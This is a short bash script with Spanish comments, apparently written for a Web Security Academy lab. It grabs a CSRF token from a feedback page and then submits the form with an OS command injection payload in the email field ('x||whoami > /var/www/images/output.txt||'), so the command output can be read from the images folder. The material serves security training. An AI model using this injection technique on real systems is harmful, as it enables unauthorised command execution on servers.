# 1. Definir la URL
URL="https://0ad8004a04231aee80bb1d340012008b.web-security-academy.net/feedback"

# 2. Extraer el CSRF y guardarlo en la variable $TOKEN
TOKEN=$(curl -s -c cookies.txt "$URL" | grep 'name="csrf"' | sed -E 's/.*value="([^"]+)".*/\1/')

# 3. Verificar que se capturó
echo -e "\e[1;34m[*] CSRF Capturado:\e[1;32m $TOKEN\e[0m"

#4 subir el arxhivo xon ese token csrf
curl -i -X POST -b cookies.txt \
--data-urlencode "csrf=$TOKEN" \
--data-urlencode "name=reos" \
--data-urlencode "email=x||whoami > /var/www/images/output.txt||" \
--data-urlencode "subject=test" \
--data-urlencode "message=test" \
"https://0ad8004a04231aee80bb1d340012008b.web-security-academy.net/feedback/submit"

#buscar en la carpeta de imagenes en este caso
